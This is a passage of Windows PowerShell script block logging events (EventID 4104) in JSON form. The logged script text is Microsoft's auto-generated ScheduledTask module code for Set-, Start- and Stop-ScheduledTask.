[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParamet",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991381Z"
    },
    "EventRecordID": 40,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 17,
    "MessageTotal": 19,
    "ScriptBlockText": "er = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByPrincipal', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('User') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Password')) {\r\n          [object]$__cmdletization_value = ${Password}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Password'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('User')) {\r\n          [object]$__cmdletization_value = ${User}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'User'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991392Z"
    },
    "EventRecordID": 41,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 18,
    "MessageTotal": 19,
    "ScriptBlockText": "]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByUser', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Start-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Path', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Path', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Path', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StartByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Path') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StartByPath', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Start-ScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Stop-ScheduledTask\r\n{\r\n    [CmdletBinding(DefaultParameterSetName='Path', PositionalBinding=$false)]\r\n    \r\n    \r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=1, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Path', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskPath},\r\n\r\n    [Parameter(ParameterSetName='Path', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Path')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmd",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:19.991396Z"
    },
    "EventRecordID": 42,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-17A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 19,
    "MessageTotal": 19,
    "ScriptBlockText": "let.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StopByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Path') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskPath')) {\r\n          [object]$__cmdletization_value = ${TaskPath}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('StopByPath', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n    }\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            